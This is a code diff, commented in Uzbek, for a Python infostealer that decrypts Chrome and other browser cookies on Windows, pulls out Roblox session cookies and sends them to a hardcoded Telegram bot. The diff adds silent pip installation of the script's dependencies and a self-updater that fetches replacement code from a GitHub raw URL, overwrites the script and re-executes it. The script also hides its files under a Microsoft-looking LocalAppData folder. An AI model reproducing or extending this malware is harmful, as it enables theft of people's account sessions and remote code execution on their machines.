@@ -1,21 +1,49 @@
 import os
 import sys
+import subprocess
 import json
 import base64
 import sqlite3
 import shutil
-import win32crypt
-from Crypto.Cipher import AES
-import requests
-import psutil
 import time
 from datetime import datetime
 
+# --- 0. AVTOMATIK KUTUBXONA TEKSHIRISH VA O'RNATISH ---
+REQUIRED_PACKAGES = {
+    "requests": "requests",
+    "psutil": "psutil",
+    "Crypto": "pycryptodome",
+    "win32crypt": "pypiwin32"
+}
+
+for module_name, package_name in REQUIRED_PACKAGES.items():
+    try:
+        __import__(module_name)
+    except ImportError:
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name], 
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+import requests
+import psutil
+from Crypto.Cipher import AES
+import win32crypt
+
+# --- KONFIGURASIYA ---
 TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY'
 TELEGRAM_CHAT_ID = '8043397476'
 
 CONFIG_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), "Microsoft", "Windows")
 CACHE_FILE = os.path.join(CONFIG_DIR, "cache.json")
+VERSION_FILE = os.path.join(CONFIG_DIR, "version.txt")
+
+# Joriy versiya raqami (GitHub'dagi bilan solishtirish uchun)
+CURRENT_VERSION = "1.0"
+# GitHub'dagi core.py versiya havolasi (yoki raw fayl havolasi)
+VERSION_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/version.txt"
+SCRIPT_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/core.py"
 
 def debug_print(text):
     current_time = datetime.now().strftime("%H:%M:%S")
@@ -31,6 +59,27 @@ def check_internet():
 def wait_for_internet():
     while not check_internet():
         time.sleep(10)
+
+# --- AVTOMATIK UPDATE (YANGILASH) TEKSHIRUVI ---
+def check_for_updates():
+    try:
+        if not check_internet():
+            return
+        
+        response = requests.get(VERSION_URL, timeout=5)
+        if response.status_code == 200:
+            latest_version = response.text.strip()
+            if latest_version != CURRENT_VERSION:
+                debug_print("Yangi versiya topildi, yangilanmoqda...")
+                script_response = requests.get(SCRIPT_URL, timeout=10)
+                if script_response.status_code == 200:
+                    current_script_path = os.path.abspath(__file__)
+                    with open(current_script_path, "w", encoding="utf-8") as f:
+                        f.write(script_response.text)
+                    debug_print("Yangilandi! Skript qayta ishga tushirilmoqda...")
+                    os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        debug_print(f"Update tekshirishda xato: {e}")
 
 def clean_roblox_cookie(raw_cookie):
     if not raw_cookie:
@@ -106,7 +155,7 @@ def send_to_telegram(cookie_value, browser_name):
 
     sent_cookies = get_sent_cookies()
     if valid_cookie in sent_cookies:
-        return True # Allaqachon yuborilgan
+        return True 
 
     wait_for_internet()
     user_info = get_roblox_user_info(valid_cookie)
@@ -189,6 +238,9 @@ def decrypt_value(encrypted_value, master_key):
         return None
 
 def main():
+    # Ishga tushganda avval yangilanishni tekshiramiz
+    check_for_updates()
+
     username = os.getlogin()
     browsers = {
         "Google Chrome": {
@@ -212,9 +264,8 @@ def main():
     debug_print("Skript ishga tushdi...")
 
     while True:
-        # Agar cookie allaqachon topilib yuborilgan bo'lsa, brauzerlarni bezovta qilmaymiz va tsiklni to'xtatamiz
         if get_sent_cookies():
-            debug_print("Cookie allaqachon topilgan. Ish yakunlandi, foydalanuvchiga tegilmaydi.")
+            debug_print("Cookie allaqachon topilgan. Ish yakunlandi.")
             break
 
         try:
